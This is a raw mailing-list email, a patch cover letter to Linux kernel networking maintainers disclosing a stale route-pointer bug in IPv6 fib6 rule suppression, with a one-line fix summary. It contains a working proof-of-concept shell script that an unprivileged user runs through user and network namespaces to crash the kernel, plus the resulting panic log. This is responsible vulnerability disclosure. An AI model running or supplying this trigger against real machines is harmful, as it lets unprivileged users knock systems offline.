Received: from mail-pf1-f169.google.com (mail-pf1-f169.google.com [209.85.210.169])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 62915385D7F
	for <netdev@vger.kernel.org>; Thu, 23 Jul 2026 16:49:25 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.169
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1784825366; cv=none; b=rA6mS/gY/oESuWT5VoFAOpb8uiXUBjq0WytB71ZFyXRZUsJ7aTMWFLNn0tY1KZycHgKSiZhVF4M3UB5vnN65oMfvuACjlAF2G8hQMJKCwMIWsveqjjyBKF8/spSRhww+YPW8DKHPiyFciu/9gagzgo2uikymIjROByy+e+pCRwY=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1784825366; c=relaxed/simple;
	bh=ZMmghFhRRcQx2w2UkqEb5v4P+vXLd0z3kmdTC1B5cCA=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=nrz+BJ4F7ueujCfYXIkQ/asLn1RC68TnN/Peht1OK8qKE88ATlYunI1I9LtrwWDPhrT7fDmPP1L8ebii+6M595qC0tphC93/b5+2F5t2K06qE8QrqzVqKCrJ3w54i/qLaHFQTKolDE/52IFEksF8/XZOHcqD56V89kGxIJjD/DU=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=TEdU8sHS; arc=none smtp.client-ip=209.85.210.169
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="TEdU8sHS"
Received: by mail-pf1-f169.google.com with SMTP id d2e1a72fcca58-8485bd28dd0so1002338b3a.2
        for <netdev@vger.kernel.org>; Thu, 23 Jul 2026 09:49:25 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1784825365; x=1785430165; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=/QedI/yULZ2AnBhQ6b6gkzWgCVVwoBqUGjfXU/zu/sI=;
        b=TEdU8sHSsICJs2IjE40C4lzryxAvlEp5eTGW9I/KcX4EdWRHK79zBW+Ff+HgF8+BUu
         HNdHBj2t6fEm02O1WN+4guSQDpLtE8bVyGEkV6StwE0RFxLsswn+7mgaxLxUf/dqiOXF
         2+uSTN/Pb+o+/uM2s7G5KyqCePh8rHGOMBdJgFzg0z0Z2Q8e5nht8CjdIT4aRnLulr4+
         Pod/idnm0ACATX1WZVjqrdMWgikGooxaKbT+M9EZZkXXOKlbzG7v66x4OI98s9tCbp2a
         GjiUDzhRFKm9MBsbMQpEpKdFdApHOtjNDM9fA0phz2K1zUUdXqsgYsvA3mVF7n9CH0FN
         NHfQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1784825365; x=1785430165;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=/QedI/yULZ2AnBhQ6b6gkzWgCVVwoBqUGjfXU/zu/sI=;
        b=rV+3X7pEALT/t9nzbG18QQxTBJUdMQ6iYUR1wxQYwR6KXKpHKP79/lejOHU6FfXPzJ
         OjsTYjqpcCnwmSRKtCkG3+1ge91FudDThctUgK9qqPYZI4jbLZy8sO/YE4YWu0FnUUZF
         3cgWBM6O9+Ww8+/YiqkpOuVk+k8zA4zPT7MAM53xlbs9uyZZQ1L+0SEYG2ZQlWJ+uShy
         IHdyvHDCPCvsl068LhR2zzM/zUm1ZlPovWSir3hzbAm3RYk3CRTU40xqyDHjrxAkK/fc
         sQscI5MFKjyAqY++iazvn1jbJUq3uSJQSbavoU3ru+EMx8hYlTHrQr0aqUXHC2iT92Uc
         yelQ==
X-Gm-Message-State: AOJu0YyFXIAI1OpmO13kLKhY6DUgK9UhpnL/DT1v3WdCvCY9+7+NGX+T
	TV+tKyHeyn1CX+kn9BRfy2KjDhUd2jX7Y2oI4d4eGTTM59cC8WH/+57W8N8Yyrxdjck=
X-Gm-Gg: AR+sD12ljdxEFm1SJd8dKOuacgsDcGZSXgikOYq1qrPFIswlGQt+9EQ2cCj5wJqbrir
	zJJzJY6dFDVq6BCrhCvxSKhGEWbasMWuyLTq3OJ5EdvySY5UBAoAOk6mr9FLd/ync0RpBHMNMH+
	EI1xV39KQ8M+gk9ESkhXmfn+xPmDRXe3CgSndgX+PelsqSafe9S5pyHgWsQ1rFf9DUR6Df4qU+9
	Z7n+ccpXRiC2c50IXechI2GP+NYhu9xYEMQ0Wzu2iHJXsdaF26pO49Qj+iOXNzUh4S4Tya6x3DB
	Zlbr4XzOVLwQavw7VpAjp4N7tcF/iPwBuQe19CJfF+ZkcZ9eqj1pA4m/7CmlcoQE/6hpLvYMfj4
	5YtrATz20hXyMU9EovfNqV9XnN9qeXxX7b/MyMRC6dK9zrEmyaPNXRG2TGGBu3oO9Nf0/RTcDI5
	9CojimL0W3zI+/78wmyjk=
X-Received: by 2002:a05:6a21:2d4b:b0:3aa:c964:3c27 with SMTP id adf61e73a8af0-3c44b1c86a1mr4377172637.46.1784825364601;
        Thu, 23 Jul 2026 09:49:24 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([167.71.204.91])
        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-3147e088d3fsm22241096eec.25.2026.07.23.09.49.10
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 23 Jul 2026 09:49:23 -0700 (PDT)
From: Ren Wei <enjou1224z@gmail.com>
To: netdev@vger.kernel.org
Cc: dsahern@kernel.org,
	idosch@nvidia.com,
	davem@davemloft.net,
	edumazet@google.com,
	pabeni@redhat.com,
	horms@kernel.org,
	Jason@zx2c4.com,
	vega@nebusec.ai,
	zhilinz@nebusec.ai,
	enjou1224z@gmail.com
Subject: [PATCH net 0/1] net: ipv6: clear suppressed fib6 rule result
Date: Fri, 24 Jul 2026 00:48:51 +0800
Message-ID: <cover.1784710966.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.51.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Zhiling Zou <zhilinz@nebusec.ai>

Hi Linux kernel maintainers,

We found and validated a issue in net/ipv6/fib6_rules.c. The bug is
reachable by a non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

fib6_rule_suppress() drops a route that matches
suppress_prefixlength, but leaves res->rt6 pointing at the released
rt6_info.

If no later IPv6 rule replaces that result, fib6_rule_lookup() still
returns the stale dst because it only checks whether res.rt6 is
non-NULL. With a final suppressing main-table rule, an unprivileged
user can first observe the wrong lookup result with `ip -6 route get`,
then trigger an imbalanced dst_release() by creating an ip6tnl device
that reuses the stale route.

The attached change clears res->rt6 when a suppressing rule rejects the
route, so the lookup falls through to the null dst instead of reusing a
released route.

Reproducer:

    chmod +x ./poc.sh
    ./poc.sh

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.sh------

#!/bin/sh
set -eu

PATH=/usr/sbin:/usr/bin:/sbin:/bin

panic_on_warn="$(cat /proc/sys/kernel/panic_on_warn)"
if [ "$panic_on_warn" != "1" ]; then
	printf '%s\n' "warning: kernel.panic_on_warn=$panic_on_warn; the bug is still observable, but this setup may only WARN instead of panicking." >&2
fi

exec unshare -Urn /bin/sh -euxc '
ip link set lo up
ip link add dummy0 type dummy
ip link set dummy0 up
ip -6 addr add 2001:db8:1::1/64 dev dummy0 nodad
ip -6 rule del pref 32766
ip -6 rule add pref 32766 table main suppress_prefixlength 64
ip -6 route get 2001:db8:1::2
ip link add tun0 type ip6tnl local 2001:db8:1::1 remote 2001:db8:1::2 mode ip6ip6
'

------END poc.sh--------

----BEGIN crash log----

[   28.263573] Kernel panic - not syncing: kernel: panic_on_warn set ...
[   28.264178] CPU: 3 UID: 1028 PID: 853 Comm: ip Not tainted 6.12.95 #1
[   28.264734] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   28.265729] Call Trace:
[   28.265964]  <TASK>
[   28.266157]  panic+0x352/0x3e0
[   28.266435]  ? rcuref_put_slowpath+0x67/0x70
[   28.266817]  check_panic_on_warn+0x44/0x60
[   28.267191]  __warn+0x91/0x120
[   28.267462]  ? rcuref_put_slowpath+0x67/0x70
[   28.267841]  report_bug+0x150/0x170
[   28.268163]  handle_bug+0x10a/0x170
[   28.268472]  exc_invalid_op+0x17/0x70
[   28.268798]  asm_exc_invalid_op+0x1a/0x20
[   28.269160] RIP: 0010:rcuref_put_slowpath+0x67/0x70
[   28.269589] Code: 31 c0 eb f0 80 3d 29 bf cf 02 00 74 0a c7 03 00 00 00 e0 31 c0 eb dd 48 c7 c7 7d 36 7e 83 c6 05 0f bf cf 02 01 e8 39 95 62 ff <0f> 0b eb df 0f 1f 44 00 00 90 90 90 90 90 90 90 90 90 90 90 90 90
[   28.271193] RSP: 0018:ffffc900011cf810 EFLAGS: 00010286
[   28.271648] RAX: 0000000000000000 RBX: ffff888106388e00 RCX: 0000000000000027
[   28.272293] RDX: ffff88813bda1a08 RSI: 0000000000000001 RDI: ffff88813bda1a00
[   28.272908] RBP: ffffc900011cf858 R08: 0000000000000000 R09: 0000000000000003
[   28.273523] R10: ffffc900011cf6b0 R11: ffffffff84583688 R12: ffff88810aecc000
[   28.274148] R13: ffff88810bcd1000 R14: ffff88810aecc9c8 R15: 0000000000000000
[   28.274758]  dst_release+0x35/0x90
[   28.275075]  ip6_tnl_link_config+0x150/0x1c0
[   28.275452]  ip6_tnl_dev_init+0xdb/0x110
[   28.275796]  register_netdevice+0x159/0x840
[   28.276169]  ? srso_alias_return_thunk+0x5/0xfbef5
[   28.276586]  ? nla_memcpy+0x27/0x50
[   28.276973]  ip6_tnl_create2+0x38/0x170
[   28.277311]  ip6_tnl_newlink+0xa8/0x110
[   28.277650]  __rtnl_newlink+0x761/0x9d0
[   28.278001]  rtnl_newlink+0x47/0x70
[   28.278295]  rtnetlink_rcv_msg+0x2ca/0x440
[   28.278689]  ? ___slab_alloc+0x989/0xba0
[   28.279058]  ? kmalloc_reserve+0x93/0x100
[   28.279441]  ? __pfx_rtnetlink_rcv_msg+0x10/0x10
[   28.279833]  netlink_rcv_skb+0x58/0x110
[   28.280138]  netlink_unicast+0x25d/0x390
[   28.280429]  netlink_sendmsg+0x222/0x490
[   28.280739]  __sock_sendmsg+0x83/0x90
[   28.281105]  ____sys_sendmsg+0x28c/0x310
[   28.281476]  ? copy_msghdr_from_user+0x7d/0xc0
[   28.281909]  ___sys_sendmsg+0x9a/0xe0
[   28.282254]  ? __handle_mm_fault+0x5ed/0x860
[   28.282662]  ? __count_memcg_events+0x79/0x140
[   28.283112]  __sys_sendmsg+0x87/0xe0
[   28.283459]  do_syscall_64+0x58/0x120
[   28.283815]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
[   28.284342] RIP: 0033:0x7d3d96dd8687
[   28.284711] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08 03 00 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24 10 0f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff ff
[   28.286534] RSP: 002b:00007ffcbfa96590 EFLAGS: 00000202 ORIG_RAX: 000000000000002e
[   28.287285] RAX: ffffffffffffffda RBX: 00007d3d96bab840 RCX: 00007d3d96dd8687
[   28.288012] RDX: 0000000000000000 RSI: 00007ffcbfa96640 RDI: 0000000000000003
[   28.288714] RBP: 00007ffcbfa96640 R08: 0000000000000000 R09: 0000000000000000
[   28.289537] R10: 0000000000000000 R11: 0000000000000202 R12: 00007ffcbfa9674c
[   28.290421] R13: 00005bb13a7ca920 R14: 00005bb13a7ca020 R15: 0000000000000000
[   28.291350]  </TASK>
[   28.292986] Kernel Offset: disabled

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  net: ipv6: clear suppressed fib6 rule result

 net/ipv6/fib6_rules.c | 1 +
 1 file changed, 1 insertion(+)

-- 
2.43.0
